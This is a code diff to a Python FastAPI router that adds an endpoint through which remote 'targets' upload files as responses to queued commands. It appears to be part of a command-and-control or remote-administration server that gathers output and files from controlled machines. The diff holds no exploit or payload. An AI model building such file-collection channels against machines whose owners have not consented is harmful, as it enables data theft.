@@ -1,10 +1,10 @@
 from asyncio import CancelledError, create_task
 import datetime
-from fastapi import HTTPException, WebSocket, APIRouter, WebSocketDisconnect
+from fastapi import HTTPException, UploadFile, WebSocket, APIRouter, WebSocketDisconnect
 from fastapi.security import APIKeyQuery
-from ..globals import redis_client_aio, target_db_manager, target_status_manager, command_store
+from ..globals import redis_client_aio, target_db_manager, target_status_manager, command_store, file_manager
 from ..config import MAX_COMMAND_LIFE
-from api.common import CommandToSend, RecieveTextResponse
+from api.common import CommandResult, CommandToSend, RecieveTextResponse
 
 
 router = APIRouter()
@@ -73,7 +73,26 @@ def receive_command_response(response: RecieveTextResponse):
         print(F"Error: {e}")
         raise HTTPException(status_code=400, detail="Invalid response format")
     
+@router.post("/commands/file-response")
+def receive_file_command_response(file: UploadFile, target_id: str, access_key: str, command_id: str):
+    target = target_db_manager.get_target_by_id(target_id)
+    if not target or target.target_access_key != access_key:
+        raise HTTPException(status_code=400, detail="Target not found/ Invalid key")
     
+    try:
+        file_model = file_manager.add_file(target.target_id, target.name, file.file.read(), filename=file.filename)
+    except Exception as e:
+        print(F"Error: {e}")
+        raise HTTPException(status_code=500, detail="Internal error saving file")
+
+    try:
+        if command_store.store_command_response(command_id, RecieveTextResponse(command_id=command_id, access_key=access_key, target_id=target_id, response=CommandResult(result={"file_ref" : file_model.file_reference}, success=True))):
+            return {"status": "success", "message": "Response received"}
+        else:
+            raise HTTPException(status_code=400, detail="Invalid command ID or command expired")
+    except Exception as e:
+        print(F"Error: {e}")
+        raise HTTPException(status_code=400, detail="Invalid response format")
     
 @router.websocket("/ws/stream/response")
 async def recieve_stream_response(websocket: WebSocket, command_id: str, access_key: str, target_id: str):
